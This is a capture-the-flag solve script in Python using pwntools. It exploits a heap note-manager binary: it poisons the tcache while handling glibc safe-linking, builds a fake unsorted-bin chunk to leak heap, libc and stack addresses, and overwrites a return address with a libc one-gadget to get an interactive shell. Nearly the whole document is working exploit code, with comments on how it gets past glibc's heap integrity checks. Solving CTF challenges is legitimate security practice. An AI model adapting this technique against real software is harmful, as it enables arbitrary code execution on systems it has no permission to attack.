# EPT EPT EPT

## solve.py

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

args.LOCAL = True
exe = context.binary = ELF(args.EXE or "./vcs_first")
libc = ELF(args.LIBC or "/lib/x86_64-linux-gnu/libc.so.6")
host = args.HOST or "nobabytoday.junk.is"
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


gdbscript = """
continue
""".format(
    **locals()
)

# -- Exploit goes here --


def create(idx):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b">", str(idx).encode())


def edit(idx, data):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b">", str(idx).encode())
    io.sendlineafter(b">", data)


def delete(idx):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b">", str(idx).encode())


def view(idx):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b">", str(idx).encode())
    data = io.recvline()
    log.info(f"Note {idx}: {data}")
    return data


def ptr_mangle(addr, val):
    return (addr >> 12) ^ val


def www(addr, content):
    create(0)
    create(1)

    delete(0)
    delete(1)
    edit(1, p64(ptr_mangle(heap + 0x300, addr)))
    create(2)

    create(3)
    edit(3, content)


def read_addr(addr):
    create(0)
    create(1)

    delete(0)
    delete(1)
    edit(1, p64(ptr_mangle(heap + 0x300, addr)))
    create(2)
    create(3)
    return view(3)


io = start()

create(0)
create(1)
delete(0)
delete(1)
# leak heap
x = view(0).strip()
heap = u64(x.ljust(8, b"\x00")) * 0x1000
log.info(f"heap @ {hex(heap)}")
edit(1, p64(ptr_mangle(heap + 0x300, heap + 0x500)))
create(2)
create(3)
# https://blog.1nf1n1ty.team/hacktricks/binary-exploitation/libc-heap/heap-memory-functions/heap-functions-security-checks
# create fake chunck at 0x500, and set valid size (too large for tcache)
edit(3, p64(0x4040404040404040) + p64(0x421))

# If the chunk is not marked as used (in the prev_inuse from the following chunk):
#  double free or corruption (!prev)
www(heap + 0x500 + 0x420, b"AAAAAAAA\x61")

# Check if the indicated size of the chunk is the same as the prev_size indicated in the next chunk
#  corrupted size vs. prev_size
www(heap + 0x500 + 0x420 + 0x60, b"AAAAAAAA\x61")


# create fake chunk at 0x510
create(0)
create(1)
delete(0)
delete(1)
edit(1, p64(ptr_mangle(heap + 0x300, heap + 0x510)))
create(2)
create(3)

# free the fake chunk into unsorted bin
delete(3)

# leak libc
x = view(3).rstrip()[1:]
print(x.hex())
libc_leak = u64(x.ljust(8, b"\x00"))
libc.address = libc_leak - 0x203B20
log.info(f"libc @ {hex(libc.address)}")
x = read_addr(libc.address + 0x2046E0)
x = view(3).rstrip()[1:]
stack_leak = u64(x.ljust(8, b"\x00"))
log.info(f"stack @ {hex(stack_leak)}")
ret_addr = stack_leak + -288
log.info(f"return address @ {hex(ret_addr)}")

www(ret_addr - 8, cyclic(8) + p64(libc.address + 0x583EC))
io.interactive()
```